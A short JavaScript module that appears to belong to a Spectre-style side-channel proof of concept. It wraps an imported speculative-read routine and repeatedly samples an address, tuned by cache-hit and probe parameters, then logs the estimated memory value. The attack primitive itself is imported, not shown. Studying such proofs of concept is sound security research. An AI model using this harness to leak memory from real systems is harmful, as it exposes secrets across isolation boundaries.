import speculativelyReadAddress_promise from "../speculatively-read-address.js";

export default
(async () => {
    const speculativelyReadAddress = await speculativelyReadAddress_promise;
    
    return function statisticallyReadMemory(address, speculative_repetitions, repetitions, min_iterations, max_cache_hit_number, page_size, probe_length) {
        for (let i = 0; i < repetitions; ++i) {
            const {
                max_indicator_index,
                second_ratio
            } = speculativelyReadAddress(address, speculative_repetitions, min_iterations, max_cache_hit_number, page_size, probe_length);
            console.log("estimated memory value", max_indicator_index);
            console.log("sr", second_ratio);
        }
    }
})();